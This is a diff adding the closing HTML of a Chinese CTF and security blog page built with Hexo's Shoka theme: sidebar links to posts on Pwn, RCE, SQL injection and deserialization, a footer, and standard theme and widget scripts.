+    <span><a href="/posts/d63a55bd.html" title="BUUCTF-Misc-第一页(1-16)">BUUCTF-Misc-第一页(1-16)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/c3c1bd42.html" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/88915f6f.html" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/384200ef.html" title="SQL无列名注入">SQL无列名注入</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/e3418ca3.html" title="随机二次元图api相关">随机二次元图api相关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/4fb535d6.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
